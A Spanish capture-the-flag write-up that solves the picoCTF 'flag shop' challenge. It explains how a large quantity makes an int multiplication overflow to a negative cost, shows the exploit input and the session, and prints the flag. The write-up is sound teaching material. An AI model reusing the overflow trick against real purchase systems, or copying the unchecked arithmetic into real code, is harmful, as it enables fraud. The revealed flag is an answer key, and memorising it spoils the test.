#### Descripción

Hay una tienda de banderas que vende cosas, ¿puedes comprar una bandera? [Fuente](https://jupiter.challenges.picoctf.org/static/64e724ad327f83ad833d9c6baa072b1f/store.c). Conéctese con .`nc jupiter.challenges.picoctf.org 4906`

### Solución 

Este reto nos proporciona un programa que simula una tienda para comprar banderas. La fuente se proporciona y se encuentra a continuación.

```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    setbuf(stdout, NULL);
    int con;
    con = 0;
    int account_balance = 1100;
    while(con == 0){
        
        printf("Welcome to the flag exchange\n");
        printf("We sell flags\n");

        printf("\n1. Check Account Balance\n");
        printf("\n2. Buy Flags\n");
        printf("\n3. Exit\n");
        int menu;
        printf("\n Enter a menu selection\n");
        fflush(stdin);
        scanf("%d", &menu);
        if(menu == 1){
            printf("\n\n\n Balance: %d \n\n\n", account_balance);
        }
        else if(menu == 2){
            printf("Currently for sale\n");
            printf("1. Defintely not the flag Flag\n");
            printf("2. 1337 Flag\n");
            int auction_choice;
            fflush(stdin);
            scanf("%d", &auction_choice);
            if(auction_choice == 1){
                printf("These knockoff Flags cost 900 each, enter desired quantity\n");
                
                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 900*number_flags;
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }   
                }   
            }
            else if(auction_choice == 2){
                printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n");
                printf("Enter 1 to buy one");
                int bid = 0;
                fflush(stdin);
                scanf("%d", &bid);
                
                if(bid == 1){
                    
                    if(account_balance > 100000){
                        FILE *f = fopen("flag.txt", "r");
                        if(f == NULL){

                            printf("flag not found: please run this on the server\n");
                            exit(0);
                        }
                        char buf[64];
                        fgets(buf, 63, f);
                        printf("YOUR FLAG IS: %s\n", buf);
                        }     
                    else{
                        printf("\nNot enough funds for transaction\n\n\n");
                    }
                }
            }
        }
        else{
            con = 1;
        }
    }
    return 0;
}
```

Este programa imprime la bandera si compramos una bandera 1337, por lo que nuestro objetivo es comprar la bandera 1337. Podemos comprar la bandera si el saldo de nuestra cuenta es superior a 100000. Desafortunadamente, el saldo de nuestra cuenta comienza en 1100, por lo que tenemos que encontrar una manera de aumentar nuestro saldo. Tras una inspección más detallada, nuestra única forma de cambiar el saldo de la cuenta es restarle .`account_balance = account_balance - total_cost;`

Lo importante que hay que tener en cuenta para resolver este problema es que todos los números de este programa son de tipo int, lo que significa que pueden ser positivos y negativos. También significa que los enteros están enlazados a INT_MIN y INT_MAX porque utilizan un número fijo de bits, normalmente 32 o 64.

Otra cosa importante es el comportamiento de los enteros cuando se pasa INT_MAX y INT_MIN. Sumar dos enteros que dan como resultado un número mayor que INT_MAX se conoce como desbordamiento y es un comportamiento indefinido. Esto que sucede en el lado INT_MIN es un flujo inferior. La mayoría de los números enteros se representan usando [el complemento a dos, ya que](https://en.wikipedia.org/wiki/Two%27s_complement) la suma es una operación idéntica independientemente de si los números son positivos o negativos.

Entonces, ¿cómo se aplica esto a nuestro desafío? Volviendo a la línea, , si hacemos que el coste total sea negativo podemos añadir a nuestro saldo de cuenta para que podamos comprar la bandera. Si miramos más arriba podemos ver cómo podemos controlar .`account_balance = account_balance - total_cost;``total_cost`

```c
scanf("%d", &number_flags);
    if(number_flags > 0){
        int total_cost = 0;
        total_cost = 900*number_flags;
```

Podemos suministrar un número mayor que 0 que luego se multiplica por 900. Como no podemos proporcionar un número negativo, tenemos que proporcionar un número que se desborde cuando se multiplique por 900. Cuando el número se desborda, debe ser negativo, lo que nos permite agregar un número arbitrario al saldo de nuestra cuenta. Elegí usar 2^23 (8388608). Podemos proporcionar esto al programa como se detalla a continuación.

```
$ nc 2019shell1.picoctf.com 63894
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
8388608

The final cost is: -1040187392

Your current balance after transaction: 1040188492

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_818a7f84}
Welcome to the flag exchange
We sell flags

3. Check Account Balance

4. Buy Flags

5. Exit

 Enter a menu selection
3
```

Esto nos da la bandera, .`picoCTF{m0n3y_bag5_818a7f84}`